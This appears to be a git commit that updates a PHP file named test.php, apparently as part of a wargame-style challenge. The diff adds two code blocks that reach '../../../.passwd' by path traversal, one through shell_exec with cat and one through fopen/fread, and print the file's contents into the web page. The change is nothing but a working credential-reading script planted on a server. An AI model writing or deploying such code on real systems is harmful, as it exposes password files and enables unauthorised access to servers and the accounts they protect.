0046f992e16de6a9c38d5e20d9455c5af1f19e1e
aambbroo <amvrosy2001@yandex.ru>
2025-09-14 00:47:54 +0300

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,12 @@
 <?php echo base64_decode("c2NvcnBpb24gc2F5IGdldCBvdmVyIGhlcmU="); ?>
+<?php
+$output = shell_exec('cat ../../../.passwd');
+echo "<b>$output</b>";
+?>
+<?php
+$filename = '../../../.passwd';
+$handle = fopen($filename, "rb");
+$contents = fread($handle, filesize($filename));
+fclose($handle);
+echo "<b>$contents</b>";
+?>
